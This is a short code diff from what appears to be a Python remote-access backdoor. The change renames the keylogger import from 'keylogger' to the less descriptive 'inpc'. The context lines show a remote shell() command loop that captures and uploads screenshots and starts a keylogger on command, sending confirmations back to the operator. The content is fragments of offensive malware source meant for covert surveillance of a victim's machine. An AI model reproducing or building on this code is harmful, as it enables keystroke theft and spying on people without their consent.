@@ -4,7 +4,7 @@ import subprocess
 import time
 import os
 import pyautogui
-import keylogger
+import inpc
 import threading
 import shutil
 import sys
@@ -88,7 +88,7 @@ def shell():
             upload_file('screen.png')
             os.remove('screen.png')
         elif command[:12] == 'keylog_start':
-            keylog = keylogger.Keylogger()
+            keylog = inpc.Keylogger()
             t = threading.Thread(target=keylog.start)
             t.start()
             reliable_send('[+] Keylogger Started!')
